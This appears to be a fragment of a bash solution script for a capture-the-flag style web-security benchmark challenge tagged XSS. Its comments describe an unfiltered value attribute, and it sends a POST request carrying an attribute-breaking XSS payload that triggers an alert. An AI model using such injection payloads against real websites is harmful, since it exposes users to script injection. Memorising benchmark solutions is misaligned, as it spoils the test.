#!/usr/bin/env bash
# XBEN-064-24 — "Dalgona Challenges", circle (tags: xss)
#
# `value="..."` with nothing filtered at all, reached by POST. Closing the quote
# turns the rest of the field into attributes of the input.
#
...
seq="$("$H5I" websec replay req_0 --create --set method=POST --set 'form.solution=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
